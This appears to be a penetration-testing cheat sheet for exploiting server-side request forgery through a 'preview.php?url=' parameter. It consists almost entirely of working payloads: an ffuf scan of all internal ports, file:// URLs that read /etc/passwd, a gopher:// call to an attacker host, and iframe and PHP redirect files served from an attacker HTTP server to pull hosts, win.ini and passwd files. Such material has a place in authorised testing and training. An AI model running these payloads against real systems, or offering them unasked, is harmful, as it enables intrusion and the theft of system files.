# SSRF

View internal system files by abusing SSRF, or scan for internal ports via SSRF.

## Scan Internal Ports

    ffuf -u 'http://TARGET_IP/preview.php?url=http://127.0.0.1:FUZZ/' -w <(seq 1 65535) -mc all -t 100 -fs 0

## GET requests

Access internal files with "file" protocol

    http://TARGET_IP/preview.php?url=file:///etc/passwd

Gopher protocol

    http://TARGET_IP/preview.php?url=gopher://ATTACK_IP/test

Access internal applications (Results from the internal port scanning)

    http://TARGET_IP/preview.php?url=http://127.0.0.1:10000

## HTML content parser

### 1) Create an HTML file with this content

Windows

    <iframe src="C:/Windows/system32/drivers/etc/hosts" height=1000 width=1000 />

Linux
    
    <iframe src="/etc/passwd" height=1000 width=1000 />

#### If the server uses PHP, you can create an index.php file instead with this content

Windows

    <?php
    header('Location: file:///Windows/win.ini');
    ?>

Linux

    <?php
    header('Location: file:///etc/passwd');
    ?>

### 2) Host it on an HTTP server

    python3 -m http.server 80

### 3) Exploit SSRF

Example

    url=http://ATTACK_IP/index.html

Then, the file will be viewed as an iframe, just like in the HTML.
